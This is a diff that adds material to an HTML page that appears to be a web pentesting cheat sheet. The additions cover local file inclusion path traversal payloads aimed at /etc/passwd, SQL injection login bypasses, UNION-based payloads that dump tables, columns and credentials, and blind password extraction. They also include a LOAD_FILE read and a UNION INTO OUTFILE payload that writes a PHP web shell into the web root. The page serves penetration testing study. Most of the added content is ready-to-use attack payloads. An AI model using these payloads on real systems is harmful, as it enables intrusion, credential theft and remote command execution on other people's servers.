@@ -55,6 +55,13 @@
                 </div>
                         <h2 id="Local File Inclusion">LFI: Local File Inclusion</h2>
                         <ul>
+                            <h3>Basic path traversal payloads</h3><pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
+http://.../index.php?language=/../../../../etc/passwd
+http://.../index.php?language=....//....//....//....//etc/passwd
+http://.../index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+http://.../index.php?language=./languages/../../../../etc/passwd
+http://...index.php?language=/etc/passwd%00.php</code></pre>
+
                             <h3>Local File Inclusion using UNICODE chars</h3>
                             <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
                             <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
@@ -68,6 +75,7 @@
     ' OR '1'='1
     " OR "1"="1" --
     ' OR 1=1 --
+    ' OR 1'='1
     ' --</code></pre>
                     <h3>Automate using SQLmap</h3>
                     <ul> 
@@ -79,6 +87,11 @@ sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main -T u
 
                     <h3>Union select payloads</h3>
                     <ul>
+                        <p>After everything remember that all this payloads have variants</p>
+                        <pre><code class="language-sql">cn') UNION ...
+cn' UNION select 1,2,3,4 --
+cn' UNION select 1,2,3,4 -- -
+cn' UNION select 1,2,3,4 #</code></pre>
                         <p>Identify the number of colums. Remember to try diferent numbers of columns untill you get no errors</p>
                         <pre><code class="language-sql">cn' UNION select 1,2,3,4--</code></pre>
                         <p>Once you have a right number you can start injecting </p>
@@ -96,26 +109,46 @@ cn' UNION select 1,database(),3,4--</code></pre>
                             <pre><code class="language-sql">SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES #Example
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--</code></pre>    
                             <p>Show column names</p>        
-                             <pre><code class="language-sql">SELECT COLUM_NAME,TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="users"; #Example
+                             <pre><code class="language-sql">SELECT COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="users"; #Example
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></pre>    
                             <p>Show data</p>
                             <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>        
                         </ul>
                     </ul>
+
+                    <h3>Reading local files</h3>
+                    <ul>
+                        <p>Checking permissions</p>
+                        <pre><code class="language-sql">cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </code></pre>  
+                        <p>Reading files</p>
+                        <pre><code class="language-sql">SELECT LOAD_FILE('/etc/paswd');</code></pre>  
+                    </ul>
+
+                    <h3>Writting local files</h3>
+                    <ul>
+                       <p>Checking permissions. If value is empty means that we can write any file. If value contains a fixed path means </p>
+                        <pre><code class="language-sql">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" #Example
+cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global_variables where variable_name="secure_file_priv" --</code></pre>  
+                        <p>Writting files using SELECT</p>
+                        <pre><code class="language-sql">cn' union select "",'&lt;?php system($_GET["cmd"])?&gt;',"","" into outfile '/var/www/html/shell4.php'#</code></pre>   
+                    </ul>    
                     <h3> Blind SQL injection </h3>
+                    <ul>
                     Rememer to intercept the requests since in this case the injection has been made in the cookie.
                     In this case it has been detected that if the query was valid a string was displayed on the screen.
                     To check if a table exists we can use the following command
                     <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
                     We used the following query to check letter by letter the password
                     <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
-                    
+                    </ul>
+
                     <h3> Situations</h3>
-                    It is possible that to determine which parameter is injectable within the union we have to
-                    insert text in any of them trying the following way. If we can make it not jump
-                    no error would mean that this parameter is injectable   
-                    <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
-                
+                    <ul>
+                        It is possible that to determine which parameter is injectable within the union we have to
+                        insert text in any of them trying the following way. If we can make it not jump
+                        no error would mean that this parameter is injectable   
+                        <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
+                    </ul>    
                     </ul>
                     
                     <h2 id="LDAP injection">LDAP injection</h2>
